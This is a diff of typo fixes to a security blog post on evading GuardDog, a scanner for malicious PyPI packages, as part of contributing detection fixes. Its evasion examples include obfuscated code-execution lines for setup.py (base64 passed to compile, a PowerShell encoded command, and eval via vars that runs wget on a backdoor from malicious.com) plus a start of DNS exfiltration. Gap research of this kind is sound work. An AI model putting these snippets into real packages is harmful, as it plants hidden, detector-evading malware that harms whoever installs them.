@@ -82,14 +82,14 @@ I was interested in contributing to GuardDog as an open-source project, which le
 
 ### Evading Code Execution Detection
 
-One of the most common behaviors observed in malicious packages is **automatic code execution** during installation. Examining `guarddog/analyzer/sourcecode/code-execution.yml`, we can see the set of code execution patterns that GuardDog is can detect in PyPI packages.
+One of the most common behaviors observed in malicious packages is **automatic code execution** during installation. Examining `guarddog/analyzer/sourcecode/code-execution.yml`, we can see the set of code execution patterns that GuardDog can detect in PyPI packages.
 
 In this context, code execution refers to the use of dangerous functions such as `exec()`, `eval()`, `os.system()`, and similar primitives. GuardDog intentionally limits these checks to files like `setup.py` and `__init__.py`, where malicious packages most commonly trigger execution. This scoping is a deliberate design choice to reduce false positives, as scanning for code execution patterns across an entire package would flag many legitimate use cases and significantly increase noise.
 
 We notice that there are no patterns to detect `compile()` and `vars()` indirection and both of these primitives can help us evade code execution detection. All we have to do is use one of the followwing:
 
 ```python
-# These are just examples of how command execution in setup.py looks like
+# These are just examples of how code execution in setup.py looks like
 compile(__import__('base64').b64decode('ZXhlYyhfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnZWNobyBtYWx3YXJlJykp'), '<string>', 'exec')
 compile("subprocess.Popen('powershell -EncodedCommand cABvAHc=', shell=False)", '<string>', 'eval')
 vars(__builtins__)['eval']("__import__('os').system('wget http://malicious.com/backdoor.sh')")
@@ -127,7 +127,7 @@ GuardDog also includes detection logic for sensitive data exfiltration, focusing
 
 However, this approach has limitations. One notable gap is the lack of detection for DNS-based exfiltration, a technique commonly used by malware to evade network monitoring and static analysis. By encoding data into DNS queries and relying on standard name resolution APIs, malicious code can leak information while appearing indistinguishable from normal application behavior. From a static analysis perspective, these patterns are difficult to differentiate from legitimate DNS usage, and as a result they often fall outside the scope of GuardDog’s current exfiltration heuristics. This highlights a broader challenge in supply chain security: attackers increasingly favor low-signal, protocol-abusing techniques that blend into normal behavior and are inherently hard to catch with static analysis.
 
-Looking at `guarddog/analyzer/sourcecode/exfiltrate-sensitive-data.yml` we notice that GuardDog uses taint analysis to detect data flow from specific sources to specific sinks. Also, we notice that there are no sinks that atetmpt to detect data exfiltration via DNS requests. So we can evade detection by using any of the following:
+Looking at `guarddog/analyzer/sourcecode/exfiltrate-sensitive-data.yml` we notice that GuardDog uses taint analysis to detect data flow from specific sources to specific sinks. Also, we notice that there are no sinks that attempt to detect data exfiltration via DNS requests. So we can evade detection by using any of the following:
 
 ```python
 import socket
@@ -155,8 +155,8 @@ I've already opened a PR to address the lack of data exfiltration detection via 
 
 ## Final Observations
 
-One of the fundamental challenges in detecting malicious packages is the sheer flexibility of software itself. There are countless ways to achieve the same outcome in code, and with even minor deviations, dded indirection, randomness, or unconventional control flow—static analysis quickly begins to struggle.
+One of the fundamental challenges in detecting malicious packages is the sheer flexibility of software itself. There are countless ways to achieve the same outcome in code, and with even minor deviations, added indirection, randomness, or unconventional control flow—static analysis quickly begins to struggle.
 
-This is not a failure of tools like GuardDog and Semgrep, but a limitation of the model they operate in. Pattern-based detection can only reason about what it has seen before, and adversaries actively optimize for being just different enough to evade those patterns. As supply chain attacks continue to evolve, effective defense will require layering static analysis with contextual, behavioral, and ecosystem-level signals rather than relying on any single approach to catch everything.
+This is not a failure of tools like GuardDog and Semgrep, but a limitation of the model they operate in. Pattern-based detection can only reason about what it has seen before, and adversaries actively optimize for being just different enough to evade those patterns. As supply chain attacks continue to evolve, effective defense requires layering static analysis with contextual, behavioral, and ecosystem-level signals rather than relying on any single approach to catch everything.
 
 The implication is clear: no single control is sufficient. Supply chain security requires defense in depth, combining static analysis with runtime protections, provenance and integrity checks, network monitoring, and human review. Static tools raise the bar, but layered defenses are what make exploitation meaningfully harder in practice.
